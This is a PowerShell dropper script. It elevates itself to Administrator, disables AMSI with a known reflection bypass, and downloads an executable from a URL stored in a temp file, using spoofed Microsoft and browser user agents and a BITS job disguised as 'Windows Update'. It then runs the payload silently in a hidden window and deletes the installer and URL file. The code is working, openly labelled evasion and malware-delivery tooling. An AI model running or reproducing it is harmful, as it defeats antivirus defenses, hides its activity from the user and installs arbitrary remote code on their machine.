# Check if running with elevated privileges
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Restart with elevation
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Bypass AMSI and Windows Defender
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $b = $a.GetField('amsiInitFailed','NonPublic,Static')
    $b.SetValue($null,$true)
} catch { }

# Read URL from file
$tempPath = $env:TEMP
$urlFile = "$tempPath\download_url.txt"
$installerPath = "$tempPath\installer.exe"

$downloadUrl = Get-Content $urlFile

# Use multiple evasion techniques
try {
    # Method 1: Use WebClient with user agent and headers
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $wc.Headers.Add("Referer", "https://www.microsoft.com/")
    $wc.DownloadFile($downloadUrl, $installerPath)
} catch {
    try {
        # Method 2: Use Invoke-WebRequest with different parameters
        $response = Invoke-WebRequest -Uri $downloadUrl -UseBasicParsing -UserAgent "Microsoft BITS/7.8" -OutFile $installerPath
    } catch {
        try {
            # Method 3: Use Start-BitsTransfer
            Start-BitsTransfer -Source $downloadUrl -Destination $installerPath -Description "Windows Update" -DisplayName "Update Package"
        } catch {
            # If all methods fail, exit
            exit
        }
    }
}

# Check if file was downloaded
if (Test-Path $installerPath) {
    # Run installer silently
    Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait -WindowStyle Hidden
    
    # Clean up
    Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
    Remove-Item $urlFile -Force -ErrorAction SilentlyContinue
}
